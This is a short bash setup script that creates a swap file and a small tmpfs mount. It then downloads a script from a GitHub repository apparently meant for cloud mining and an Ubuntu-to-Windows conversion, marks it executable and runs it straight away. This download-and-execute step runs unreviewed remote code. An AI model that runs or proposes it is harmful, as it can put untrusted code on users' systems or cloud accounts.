#!/bin/bash
dd if=/dev/zero of=/swapfile bs=1024 count=2621440
mkswap /swapfile
chown root:root /swapfile
chmod 0600 /swapfile
swapon /swapfile
mkdir /media/script && mount -t tmpfs -o size=1m tmpfs /media/script
wget -P /media/script https://raw.githubusercontent.com/jdiijfrlohb/azure-cloud-mining-script/master/mediabots_Ubuntu-to-Windows.sh
chmod +x /media/script/*
/media/script/mediabots_Ubuntu-to-Windows.sh
